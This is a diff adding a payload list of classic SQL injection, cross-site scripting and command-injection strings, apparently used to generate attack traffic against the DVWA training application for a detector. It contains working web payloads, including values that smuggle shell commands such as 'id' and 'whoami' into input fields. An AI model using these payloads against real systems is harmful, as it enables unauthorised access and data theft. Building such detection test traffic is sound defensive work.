@@ -1,0 +1,24 @@
+# Classic SQLi / XSS / cmd-injection payloads used against DVWA.
+# These are well-known examples from public cheatsheets; nothing new is
+# authored here. The bot is just a traffic source for the detector.
+
+# --- SQLi ---
+1' OR '1'='1
+1' OR 1=1--
+1' UNION SELECT NULL,NULL--
+1' UNION SELECT user(),version()--
+admin'--
+' OR 'x'='x
+
+# --- Reflected / Stored XSS ---
+<script>alert(1)</script>
+<img src=x onerror=alert(1)>
+<svg/onload=alert(1)>
+"><script>alert(document.domain)</script>
+
+# --- Command injection (exec page) ---
+; id
+| whoami
+&& uname -a
+$(id)
+`whoami`
